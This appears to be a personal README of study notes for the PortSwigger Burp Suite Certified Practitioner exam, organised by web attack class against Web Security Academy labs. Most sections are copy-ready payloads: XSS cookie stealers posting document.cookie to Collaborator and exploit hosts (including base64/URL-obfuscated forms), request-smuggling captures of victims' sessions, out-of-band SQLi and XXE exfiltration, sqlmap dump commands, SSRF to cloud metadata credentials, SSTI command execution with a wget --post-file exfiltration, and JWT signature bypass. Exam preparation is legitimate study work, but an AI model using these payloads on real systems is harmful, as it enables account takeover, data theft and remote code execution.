
# Burp-Suite-Certified-Practitioner-Exam-Study
My personal study notes on the PortSwigger Academy Burp Suite Certified Practitioner (BSCP) Exam topics.  
Maybe we can use the acronym BSCP, like OSCP  :)  

[Cross Site Scripting](#cross-site-scripting)  
[Host Header Poison - forgot-password](#host-header-poison---forgot-password)  
[HTTP Request Smuggling](#http-request-smuggling)  
[Privilege Escalation JSON RoleId](#privesc-json-roleid)  
[SQLi Data Exfiltration](#sql-injection-data-exfiltration)  
[XML entities & Injections](#xxe-injections)  
[SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
[SSTI Server side template injection](#ssti---server-side-template-injection)  
[Prototype pollution](#prototype-pollution)  
[JSON Web Tokens](#jwt)  
[Focus target scanning](#focus-scanning)  


## Cross Site Scripting

+ [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+ [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  
  
### Methodology to identify allowed XSS Tags  

>Identified Reflected XSS in **search** function then determine the HTML tags and events attributes not blocked  

<sup>Body and event **'onresize'** is only allowed</sup>  

```JavaScript
?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
<sup>Body and event **'onpopstate'** is only allowed</sup>  

```JavaScript
?search=%22%3E%3Cbody%20onpopstate=print()>
```
[Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  

>The below lab gives great Methodology to identify allowed HTML tags and events for crafting POC XSS.  

[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
  
>Host **iframe** code on exploit server and deliver exploit link to victim.  

```html
<iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
```  

### Cookie Stealers (Reflected)  

>In the Search function on webapp a Reflected XSS is identified, then deliver exploit link to victim with cookie stealing payload in hosted **iframe** on exploit server.  

>WAF is preventing dangerous search filters and tags, then bypass XSS filters using JavaScript global variables.  

[Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
  
```JavaScript
fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
```
<sup>Base64 encode the payload</sup>
```
ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
```
<sub>Test payload on our own session in Search</sub>
```JavaScript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```  

+ Using the **eval()** method evaluates or executes an argument. 
+ Using **atob()** or **btoa()** is function used for encoding to and from base64 formated strings.
+ If **eval()** being blocked then Alternatives:
  + setTimeout("code")
  + setInterval("code)
  + setImmediate("code")
  + Function("code")()
  
![Burp collaborator receiving request with base64 cookie value from our POC.](xss2.png)  

>Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  

```html
<iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
```
![(Deliver reflected xss to steal victim cookie.](xss1.png)  

>Decode above payload from url encoding, is the following:  

```html
https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
```  

>Decode part of payload above that is base64 encoded to the following:  

```html
https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))"))}//  
```  
  
#### URL & Base64 encoders and decoders  

[URL Decode and Encode](https://www.urldecoder.org/)  
[BASE64 Decode and Encode](https://www.base64encode.org/)    
  
### Stored XSS

>Cross site Scriting found in Blog post comment. Cookie Stealer send victim to exploit server logs.  

```html
<img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
```  

>Product and Store lookup  

```html
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
```  

>Stored XSS Blog post  

```JavaScript
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```  

![Stored XSS Blog post](stored-xss-blog-post.png)  

>**Fetch API** JavaScript Cookie Stealer payload in Blog post comment.  

```JavaScript
<script>
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```  

[PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  

## Host Header Poison - forgot-password

### Spoof IP Address  

>Identify that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
  
<sub>Change the username parameter to carlos and send the request.</sub>  

```html
X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net
X-Host: EXPLOIT-SERVER-ID.exploit-server.net
X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
```  

<sup>Check the exploit server log to obtain the reset link to the victim username.</sup>  
  
![Exploit Server Logs capture the forgot password reset token](HOST-Header-forgot-password-reset.PNG)  

[PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  

### HOST Connection State

>Sending grouped request in sequence using single connection and setting the connection header to keep-alive, bypass host header validation and enable SSRF exploit of local server.  

```html
GET /intranet/service HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
Content-Length: 48
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive
```  

<sub>Next request is the second tab in group sequence of requests</sub>  

```html
POST /service/intranet HTTP/1.1
Host: localhost
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```  

[Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  


## HTTP Request Smuggling

>Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
  
>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **HEXADECIMAL**, and **Content-Length** specifies the length of the message body in **bytes**. Chunks are followed by a **newline**, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.  

### Content-Length Capture victim requests

>Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to 850, then smuggle it to the back-end server.

```html
POST / HTTP/1.1
Host: 0af8006004fb07f5c46a3c4600b20065.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 798
Cookie: session=rmK9dkBeR1V3lg2bCgjfOkyBxImZMb6P

csrf=nVFjkw2QdI4G6hDY9nW39x0KOtFebyAd&postId=8&name=c&email=c%40c.c&website=&comment=c
```
  
![Exploiting HTTP request smuggling with content-length value](content-length-capture-victim-request.png)  

>View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.
  
![Exploiting HTTP request smuggling to capture other users' requests](victim-request-captured-blog-comment.png)  

[PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  

### User-Agent Cookie Stealer

>Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value in smuggled request.  

<sup>Basic Cross Site Scripting Payload</sup>  

```JavaScript
 "/><script>alert(1)</script>
```

<sub>COOKIE STEALER Payload</sub>  

```JavaScript
a"/><script>document.location='http://Collaborator.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```  

>Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in UserAgent header.  

```html
POST / HTTP/1.1
Host: 0acc008e03af84c3c0274fe0004e00d4.web-security-academy.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://COLLABORATOR.oastify.com/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```  

![HTTP request smuggling to deliver reflected XSS and steal victim cookie](user-agent-cookie-stealer-smuggled.PNG)  

>Check the PortSwigger Collaborator Request received from victim browsing target.  
  
![Collaborator capture xss Request from victim browsing target](collaborator-xss-Request-received.png)  

[PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  

### Dualchunk TE  

>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use obfuscating techniques with second TE.  

<sub>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way. Ways to obfuscate the Transfer-Encoding header. For example:</sub>  

```html
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 245
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://COLLABORATOR.oastify.com/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0  
  
```  

>**Note:** You need to include the trailing sequence \r\n\r\n following the final **0**.  

[PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  


## PrivEsc JSON RoleId

>Access control to the admin interface is based on user roles, and this can lead to IDOR or accessc ontrol security vulnerability.  

>Capture current logged in user email submission request and send to **Intruder**, then add "roleid":§99§ into the JSON body of the request, and fuzz the possible roleid for administrator access role position.  

```html
POST /my-account/change-email HTTP/1.1
Host: 0a25007604813b07c2066cf20023004d.web-security-academy.net
Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
Content-Length: 48
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Connection: close

{
 "email":"newemail@wiener.peter",
 "roleid": 2
}
```  

![Intruder Payload set to identify Admin role ID](intruder-payload-positions.png)  

>Attack identify the possible role ID of administrator access role and then send this request with updated roleId to privile escalate the current logged in user to role of administator of target.  

![Attack identify Admin role ID](admin-roleid-privesc.png)  

[PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  


## SQL Injection Data Exfiltration

>Error based or Blind SQL injection vulnerabilities, in application is used to perform an SQL query to extract data or login credentials from database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  

>Adding a double or single quote to web parameters and evaluate the error message response, indicate possible SQL injection point.  

[SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  

![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  

>Out of band data exfiltration Blind SQL query, namely a tracking cookie.  

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```  

[PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  

<sup>Using SQLMAP to enumerate tracking cookie.</sup>  

```bash
sqlmap -v -r sqli-blind.txt --batch --random-agent --level=3 --risk=3 -p "TrackingId"
```  

[PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  

### SQLMAP 

>Sample SQLMAP commands to determine what SQL injection vulnerability exist and retrieving different types of information from backend database.  

<sub>SQLMAP determine the vulnerability, and perform initial enumeration.</sub>  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3
```  

<sub>SQLMAP determine the database DBMS.</sub>  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -dbs
```  

<sub>SQLMAP determine Database, Tables, dump, data Exfiltration.</sub>  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --level=3 --risk=3 --dbms=PostgreSQL -D public --tables

sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "category" --batch --cookie="session=xnxxji87qhGxOdoGKKW1ack4pZxYJlTt" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=3 --risk=3

```  

![SQLMAP used to dump data from tables](sqlmap-dump-table-data.png)


>Use SQLMAP Technique parameter as alternative to a blind boolean based vulnerability, and speed up data exfil process by doing error responses.  

```bash
sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
```  

## XXE Injections

>File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  

### Identify XML

>Possible to find XXE attack surface in requests that do not contain any XML.  

<sub>Idnetify XXE in not so obvious parameters or requests by adding the below and URL encode the **&** symbol.</sub>  

```xml
%26entity;
```  

![Identify XML Injections](identify-xxe.png)

### DTD Hosted Exploit  

>On the exploit server host a exploit file with DTD extension, containing the following payload.  

```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.net/?x=%file;'>">
%eval;
%exfil;
```  
  
![Exploit.DTD file hosted](exploit.dtd.png)  

>Modify the file upload XML body of the request before sending to the target server.  

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>Carl Toyota</username>
        <email>carl@hacked.net</email>
    </user>    
</users>

```

![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  

[PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  

### Xinclude file read  

>Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML document, not possible to use a DTD file. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file instead.  

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
```  

![XInclude to retrieve files](xinclude.png)  

[PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  


### SQL + XML + HackVector 

>SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  

>Identify injection point by using mathematical expression such as **7x7**, and this indicate possible SQL injection or Template injections.

![identify-math-evaluated-xml](identify-math-evaluated-xml.png)  

>WAF detect attack when appending SQL query such as a UNION SELECT statement to the original store ID.  

```sql
<storeId>1 UNION SELECT NULL</storeId>
```  

>Bypass the WAF, Use Burp extension **Hackvertor** to obfuscate the SQL Injection payload in the XML post body. 

![Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor](hackvertor.png)  

>Webapp return one column, thus need to concatenate the returned usernames and passwords columns from the users table.  
 
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```  

![SQL injection with filter bypass via XML encoding obfuscation](xml-sql-obfuscation.png)  

>SQLi Payloads to read local file, and or output to another folder on target.  

```sql
<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  

<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
```  

[PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  

## SSRF - Server Side Request Forgery  

>SSRF attack cause the server to make a connection to internal services within the organization, and force the server to connect to arbitrary external systems, potentially leaking sensitive data.  

<sub>SSRF exploitation examples</sub>

```html
/product/nextProduct?currentProductId=6&path=http://evil-user.net  

stockApi=http://localhost:6566/admin  

http://127.1:6566/admin  
```  

>Double URL encode characters in URL such as to Obfuscate the "a" by double-URL encoding it to %2561  

[PortSwigger Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)  


### Absolute GET URL + HOST SSRF

>Possible to provide an absolute URL in the GET request line and then supply different target for the HOST header.  

```html
GET https://YOUR-LAB-ID.web-security-academy.net/
Host: COLLABORATOR.DOMAIN
```  

![identify-ssrf-host](identify-ssrf-host.png)  

>Use the Host header to target 192.168.0.141 or localhost, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.  

![ssrf](ssrf.png)  

[PortSwigger Lab: SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)  


### SSRF redirect_uris  

>POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  

```html
POST /reg HTTP/1.1
Host: oauth-0a8b00df03e10b2ec300149f023b0096.web-security-academy.net
Content-Type: application/json
Content-Length: 206

{
"redirect_uris":["https://example.com"],
    "logo_uri" : "https://ct9vlhusb0to24fcrs5t3qsmpdv4jv7k.oastify.com",
	"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
	
}  
```  

![ssrf_redirect_uris.png](ssrf_redirect_uris.png)  

[PortSwigger Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)  

### XXE + SSRF

>Exploiting XXE to perform SSRF attacks using stock check function that obtains sensitive data.  

```xml

<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/latest/"> ]>
  <stockCheck>
    <productId>
      &xxe;
    </productId>
    <storeId>
      1
    </storeId>
  </stockCheck>  
```  

![xxe-ssrf-localhost.png](xxe-ssrf-localhost.png)  

[PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  


### SSRF HOST header routing  

>Routing-based SSRF via the Host header allow insecure access to a localhost intranet.  

```html
GET /service/intranet?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&readfile=/home/carlos/secret HTTP/1.1
Host: localhost
```  

<sub>**Note:** Convert the GET request to POST</sub>  

![Routing-based SSRF](Routing-based-SSRF.png)  

```html
POST / HTTP/1.1
Host: 5rxojasl9trh0xd5pl3m1jqfn6txhp5e.oastify.com
Cookie: _lab=46%7cMCwCFBucXjC6hvd9WC4%2fwP3%2fkmpxu8mhAhR%2f9lrAED4p89w%2bSBi%2fujGmrnwZhjZyG%2fmQebBgi4naIZO%2flg2daYidh0KoLFjVIEV1DKMwigDLRyL4BspAm4Kiz4iRmXJYyTpvojI18biLNQEbid7G4fT6SvZuUjONK2CLqa%2bc8VqLQcU%3d; session=GvdpmebBL2eNQZMJjJmSh4ZU8QrTDVDq
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```  

[PortSwigger Lab: Routing-based SSRF](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)  

### HTML to PDF  

>Identify file download HTML-to-PDF convert function on target is vulnerable.  

```JavaScript
<script>
	document.write('<iframe src=file:///etc/passwd></iframe>');
</script>
```  

>Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  

[PortSwigger Research HTML-to-PDF converters vuln to SSRF](https://portswigger.net/daily-swig/html-to-pdf-converters-open-to-denial-of-service-ssrf-directory-traversal-attacks)

[HTML to PDF converters such as wkhtmltopdf exploited to read local file(SSRF)](https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/index.html)  

```html
<html>
 <body>
  <script>
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open("GET", "file:///home/carlos/secret");
   x.send();
  </script>
 </body>
</html>
```  

>JSON POST request body containing the HTMLtoPDF formatted payload to read local file.  

```JSON
{
	"tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
}
```  

>Random notes on HTML-to-PDF converters & SSRF  

```
"Download report as PDF"
/adminpanel/save-report/
POST request - Body JSON 
{ 
	"tableHtml":"........<html code snip>......."
}

pdf creator: wkhtmltopdf 0.12.5
hacktricks xss cross site scripting server side xss dynamic pdf 
```  

<sup> SSRF Section incomplete ...need more input...</sup>  


## SSTI - Server Side Template Injection

>Use the web framework native template syntax to inject a malicious payload into a **{{template}}**, which is then executed server-side.  

>SSTI payloads to identify vulnerability.  

```
${{<%[%'"}}%\.,
}}{{7*7}} 

{{fuzzer}}
${fuzzer}
${{fuzzer}}

${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
${foobar}

{% debug %}
```  

>Identification of template injection.  

![Identify SSTI](identify-ssti.png)  

>Tornado Template  

```
}}
{% import os %}
{{os.system('cat /home/carlos/secret')

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
```  

![Tornado Template](tornado-template.png)  

[PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  

>Django Template  

```
${{<%[%'"}}%\,
{% debug %} 
{{settings.SECRET_KEY}}
```  

![Django template](django-template.png)  

[PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)  

>Freemarker Template  

```
${foobar}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```  

![Freemarker template](freemarker-template.png)  

[PortSwigger Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)  


>ERB Template  

```
<%= 7*7 %>
<%= system("cat /home/carlos/secret") %>
```  

![ERB template](erb-template.png)  

[PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  


>Handlebars Template  

```
${{<%[%'"}}%\,
```  

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('wget http://ext.burpcollab.net --post-file=/home/carlos/secret');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

![Handlebars template](handlebars-template.png)  

[PortSwigger Lab: Server-side template injection in an unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  


>Random notes on template injections  

```
"Update forgot email template {{}}
/admin_panel/update_forgot_email/
POST request newemail parameter


portswigger.net/research/server-side-template-injection
{{7*7}}
portswigger.net/research/template-injection

wget http://ext.burpcollab.net --post-file=/home/carlos/secret
```  

<sup> SSTI Section ...need more input...</sup>  

## ProtoType Pollution  

>A target is vulnerable to DOM XSS via client side prototype pollution. **DOM Invader** will identify the gadget and using hosted payload to phish a victim and steal their cookie.  

<sub>Exploit server Body section, host an exploit that will navigate the victim to a malicious URL</sub>

```html
<script>
    location="https://TARGET.web.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>  
```  

[PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)

![Proto pollution](proto-pollution.png)  

<sup> Proto pollution section is incomplete ...need more input...</sup>  

## JWT  

>JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.  

```jwt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```  

>Brute force weak JWT signing key  

```bash
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
```  

>JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its filesystem. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  

>JWS  

```
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}
```  

>Payload  

```
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1673523674
}
```  

![jwt](jwt.png)  

[PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  

<sup> JWT section ...need more input...</sup>  

## Focus Scanning 

>Due to the tight time limit during engagements, scan defined insertion points for specific requests.  

![scan-defined-insertion-points](scan-defined-insertion-points.png)  

>Scanner detected xmlns on stockId parameter and can lead to reading file on host parse text.  

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
```  

[PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
  
  
  
[My YouTube Exam Study Music Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YlA_fNwv4_tQAYYkIMfY5NY)  
